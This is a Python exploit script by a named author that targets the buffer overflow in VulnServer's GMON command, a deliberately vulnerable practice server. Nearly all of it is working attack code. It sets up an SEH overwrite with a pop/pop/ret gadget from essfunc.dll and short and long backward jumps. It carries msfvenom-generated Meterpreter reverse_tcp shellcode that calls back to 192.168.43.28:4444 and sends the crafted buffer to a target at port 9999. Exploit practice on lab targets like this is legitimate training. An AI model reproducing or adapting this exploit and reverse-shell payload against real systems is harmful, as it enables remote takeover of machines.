# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# Message=  0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\MA LabMachine_1\Desktop\Vulnserver\vulnserver\essfunc.dll)
# jmp $-20 EBEA //Short jump 20 bytes
# jmp $-1000 E913FCFFFF //Long jump 1000 bytes
# Shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00' -f python

import sys
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buf =  ""
buf += "\xda\xc3\xd9\x74\x24\xf4\xb8\xcd\x18\xb1\x3f\x5e\x29"
buf += "\xc9\xb1\x56\x83\xc6\x04\x31\x46\x14\x03\x46\xd9\xfa"
buf += "\x44\xc3\x09\x78\xa6\x3c\xc9\x1d\x2e\xd9\xf8\x1d\x54"
buf += "\xa9\xaa\xad\x1e\xff\x46\x45\x72\x14\xdd\x2b\x5b\x1b"
buf += "\x56\x81\xbd\x12\x67\xba\xfe\x35\xeb\xc1\xd2\x95\xd2"
buf += "\x09\x27\xd7\x13\x77\xca\x85\xcc\xf3\x79\x3a\x79\x49"
buf += "\x42\xb1\x31\x5f\xc2\x26\x81\x5e\xe3\xf8\x9a\x38\x23"
buf += "\xfa\x4f\x31\x6a\xe4\x8c\x7c\x24\x9f\x66\x0a\xb7\x49"
buf += "\xb7\xf3\x14\xb4\x78\x06\x64\xf0\xbe\xf9\x13\x08\xbd"
buf += "\x84\x23\xcf\xbc\x52\xa1\xd4\x66\x10\x11\x31\x97\xf5"
buf += "\xc4\xb2\x9b\xb2\x83\x9d\xbf\x45\x47\x96\xbb\xce\x66"
buf += "\x79\x4a\x94\x4c\x5d\x17\x4e\xec\xc4\xfd\x21\x11\x16"
buf += "\x5e\x9d\xb7\x5c\x72\xca\xc5\x3e\x1a\x3f\xe4\xc0\xda"
buf += "\x57\x7f\xb2\xe8\xf8\x2b\x5c\x40\x70\xf2\x9b\xd1\x96"
buf += "\x05\x73\x59\xf6\xfb\x74\x99\xde\x3f\x20\xc9\x48\xe9"
buf += "\x49\x82\x88\x16\x9c\x3e\x83\x80\xdf\x16\xb8\x4c\x88"
buf += "\x64\xbf\x7d\x14\xe1\x59\x2d\xf4\xa1\xf5\x8e\xa4\x01"
buf += "\xa6\x66\xaf\x8e\x99\x97\xd0\x45\xb2\x32\x3f\x33\xea"
buf += "\xaa\xa6\x1e\x60\x4a\x26\xb5\x0c\x4c\xac\x3f\xf0\x03"
buf += "\x45\x4a\xe2\x74\x32\xb4\xfa\x84\xd7\xb4\x90\x80\x71"
buf += "\xe3\x0c\x8b\xa4\xc3\x92\x74\x83\x50\xd4\x8b\x52\x60"
buf += "\xae\xba\xc0\xcc\xd8\xc2\x04\xcc\x18\x95\x4e\xcc\x70"
buf += "\x41\x2b\x9f\x65\x8e\xe6\x8c\x35\x1b\x09\xe4\xea\x8c"
buf += "\x61\x0a\xd4\xfb\x2d\xf5\x33\x78\x29\x09\xc1\x57\x92"
buf += "\x61\x39\xe8\x22\x71\x53\xe8\x72\x19\xa8\xc7\x7d\xe9"
buf += "\x51\xc2\xd5\x61\xdb\x83\x94\x10\xdc\x89\x79\x8c\xdd"
buf += "\x3e\xa2\x3f\xa7\x4f\x55\xc0\x58\x46\x32\xc1\x58\x66"
buf += "\x44\xfe\x8e\x5f\x32\xc1\x12\xe4\x4d\x74\x36\x4d\xc4"
buf += "\x76\x64\x8d\xcd"


evilString = "GMON " + "/.../" + "\x90"*3106 + buf +  "\x90"*15 + "\xE9\x13\xFC\xFF\xFF" + "\xEB\xEA\x90\x90" + "\x2B\x17\x50\x62" + "D" * 1494

s.connect(('192.168.43.72',9999))
s.recv(1024)
s.send(evilString)
s.close()
